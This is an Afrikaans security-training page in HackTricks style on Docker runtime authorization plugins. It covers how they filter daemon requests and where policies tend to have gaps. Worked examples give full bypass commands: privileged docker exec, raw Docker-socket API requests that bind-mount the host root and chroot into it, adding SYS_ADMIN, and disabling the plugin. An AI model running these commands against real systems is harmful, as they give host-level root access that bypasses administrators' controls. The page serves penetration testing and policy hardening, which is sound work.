# Runtime-magtigingsplugins

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Runtime-magtigingsplugins is ’n ekstra beleidslaag wat bepaal of ’n oproeper ’n gegewe daemon-aksie mag uitvoer. Docker is die klassieke voorbeeld. By verstek het enigiemand wat met die Docker-daemon kan kommunikeer, effektief uitgebreide beheer daaroor. Authorization plugins probeer hierdie model beperk deur die geverifieerde gebruiker en die aangevraagde API-bewerking te ondersoek, en dan die versoek volgens beleid toe te laat of te weier.

Hierdie onderwerp verdien sy eie bladsy omdat dit die exploitation-model verander wanneer ’n aanvaller reeds toegang tot ’n Docker API of tot ’n gebruiker in die `docker`-groep het. In sulke omgewings is die vraag nie meer net "kan ek die daemon bereik?" nie, maar ook "word die daemon deur ’n authorization-laag afgesper, en indien wel, kan daardie laag deur onhanteerde endpoints, swak JSON-parsing of plugin-bestuurstoestemmings omseil word?"

## Werking

Wanneer ’n versoek die Docker-daemon bereik, kan die authorization-substelsel die versoekkonteks aan een of meer geïnstalleerde plugins deurgee. Die plugin sien die geverifieerde gebruikeridentiteit, die versoekbesonderhede, geselekteerde headers, en dele van die versoek- of response-body wanneer die content type geskik is. Verskeie plugins kan geketting word, en toegang word slegs toegestaan indien alle plugins die versoek toelaat.

Hierdie model klink sterk, maar die veiligheid daarvan hang volledig af van hoe volledig die beleidsouteur die API verstaan het. ’n Plugin wat `docker run --privileged` blokkeer maar `docker exec` ignoreer, alternatiewe JSON-sleutels soos topvlak-`Binds` mis, of plugin-administrasie toelaat, kan ’n vals gevoel van beperking skep terwyl dit steeds direkte privilege-escalation-paaie ooplaat.

## Algemene plugin-teikens

Belangrike areas vir beleidshersiening is:

- container creation-endpoints
- `HostConfig`-velde soos `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` en namespace-sharing-opsies
- `docker exec`-gedrag
- plugin management-endpoints
- enige endpoint wat runtime-aksies indirek buite die bedoelde beleidsmodel kan aktiveer

Histories het voorbeelde soos Twistlock se `authz`-plugin en eenvoudige opvoedkundige plugins soos `authobot` hierdie model maklik gemaak om te bestudeer, omdat hul beleidslêers en kodepaaie gewys het hoe endpoint-tot-aksie-kartering werklik geïmplementeer is. Vir assessment-werk is die belangrike les dat die beleidsouteur die volledige API-oppervlak moet verstaan, eerder as slegs die mees sigbare CLI-opdragte.

## Misbruik

Die eerste doel is om uit te vind wat werklik geblokkeer word. As die daemon ’n aksie weier, lek die foutboodskap dikwels die plugin-naam, wat help om die beheer wat gebruik word te identifiseer:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
As jy breër endpoint-profiling benodig, is tools soos `docker_auth_profiler` nuttig omdat hulle die andersins herhalende taak outomatiseer om na te gaan watter API-roetes en JSON-strukture werklik deur die plugin toegelaat word.

As die omgewing ’n custom plugin gebruik en jy met die API kan interaksie hê, lys watter objekvelde werklik gefiltreer word:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Hierdie kontroles is belangrik omdat baie magtigingsmislukkings veldspesifiek eerder as konsep-spesifiek is. ’n Plugin mag ’n CLI-patroon verwerp sonder om die ekwivalente API-struktuur volledig te blokkeer.

### Volledige voorbeeld: `docker exec` voeg privilegie by ná skepping van die container

’n Beleid wat die skepping van gepriviligeerde containers blokkeer, maar die skepping van onbeperkte containers plus `docker exec` toelaat, kan steeds omseil word:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
As die daemon die tweede stap aanvaar, het die gebruiker ’n bevoorregte interaktiewe proses binne ’n container herwin wat die policy-outeur geglo het beperk is.

### Volledige voorbeeld: Bind Mount deur Raw API

Sommige gebroke policies inspekteer slegs een JSON-vorm. As die bind mount van die root filesystem nie konsekwent geblokkeer word nie, kan die host steeds gemount word:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselfde idee kan ook onder `HostConfig` voorkom:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die impak is ’n volledige ontsnapping uit die gasheer se lêerstelsel. Die interessante detail is dat die omseiling voortspruit uit onvolledige beleidsdekking eerder as uit ’n kernel-bug.

### Volledige voorbeeld: ongekontroleerde Capability Attribute

As die beleid versuim om ’n capability-verwante attribute te filter, kan die aanvaller ’n container skep wat weer ’n gevaarlike capability verkry:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sodra `CAP_SYS_ADMIN` of ’n soortgelyke sterk capability teenwoordig is, word baie breakout-tegnieke wat in [capabilities.md](protections/capabilities.md) en [privileged-containers.md](privileged-containers.md) beskryf word, bereikbaar.

### Volledige voorbeeld: Deaktiveer die Plugin

As plugin-management-bedrywighede toegelaat word, kan die skoonste bypass wees om die beheer heeltemal af te skakel:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dit is ’n beleidsmislukking op die beheer-vlak. Die authorization-laag bestaan, maar die gebruiker wat dit moes beperk, behou steeds toestemming om dit te deaktiveer.

## Kontroles

Hierdie opdragte is daarop gemik om te bepaal of ’n beleidslaag bestaan en of dit volledig of oppervlakkig blyk te wees.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Wat hier interessant is:

- Denial-boodskappe wat ’n plugin-naam insluit, bevestig ’n authorization-laag en openbaar dikwels die presiese implementering.
- ’n Plugin-lys wat vir die aanvaller sigbaar is, kan genoeg wees om te ontdek of disable- of reconfigure-operasies moontlik is.
- ’n Policy wat slegs ooglopende CLI-aksies blokkeer, maar nie raw API-versoeke nie, moet as omseilbaar beskou word totdat die teendeel bewys is.

## Runtime-verstekke

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Nie by verstek enabled nie | Daemon-toegang is effektief alles-of-niks tensy ’n authorization-plugin gekonfigureer is | onvolledige plugin-policy, blacklists in plaas van allowlists, die toelaat van plugin-bestuur, blindekolle op veldvlak |
| Podman | Nie ’n algemene direkte ekwivalent nie | Podman steun gewoonlik meer op Unix-permissions, rootless-uitvoering en besluite oor API-blootstelling as op Docker-styl authz-plugins | om ’n rootful Podman-API wyd bloot te stel, swak socket-permissions |
| containerd / CRI-O | Verskillende beheermodel | Hierdie runtimes steun gewoonlik op socket-permissions, node-vertrouensgrense en hoërlaag-orchestrator-kontroles eerder as Docker authz-plugins | om die socket in workloads te mount, swak node-plaaslike vertrouensaannames |
| Kubernetes | Gebruik authn/authz by die API-server- en kubelet-lae, nie Docker authz-plugins nie | Cluster RBAC en admission-kontroles is die hoof-policy-laag | te breë RBAC, swak admission-policy, om kubelet- of runtime-API’s direk bloot te stel |

{{#include ../../../banners/hacktricks-training.md}}
